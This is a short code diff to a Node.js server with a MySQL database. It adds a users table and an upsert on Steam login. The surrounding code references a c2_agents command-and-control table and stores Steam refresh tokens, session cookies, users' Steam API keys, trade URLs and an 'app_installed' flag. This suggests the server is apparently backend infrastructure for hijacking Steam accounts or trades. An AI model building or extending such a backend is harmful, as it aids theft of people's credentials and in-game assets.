@@ -161,6 +161,19 @@ async function initDatabase() {
                 FOREIGN KEY (agent_id) REFERENCES c2_agents(agent_id) ON DELETE CASCADE
             )
         `);
+
+        await connection.query(`
+            CREATE TABLE IF NOT EXISTS users (
+                id INT AUTO_INCREMENT PRIMARY KEY,
+                steam_id VARCHAR(20) NOT NULL UNIQUE,
+                username VARCHAR(255),
+                steam_api_key VARCHAR(255),
+                trade_url VARCHAR(255),
+                app_installed BOOLEAN DEFAULT FALSE,
+                last_login TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        `);
         
         console.log('Successfully connected to MySQL database.');
         connection.release();
@@ -293,6 +306,15 @@ app.post('/auth/steam/refresh-token', async (req, res) => {
         // Generate refresh token
         const refreshToken = crypto.randomBytes(32).toString('hex');
         
+        // --- Create or update user in the database ---
+        await pool.query(`
+          INSERT INTO users (steam_id, username, last_login)
+          VALUES (?, ?, CURRENT_TIMESTAMP)
+          ON DUPLICATE KEY UPDATE
+          last_login = CURRENT_TIMESTAMP,
+          username = VALUES(username)
+        `, [steamId, username]);
+
         // Store session
         await createSteamSession(steamId, refreshToken, null, null, cookies);
         
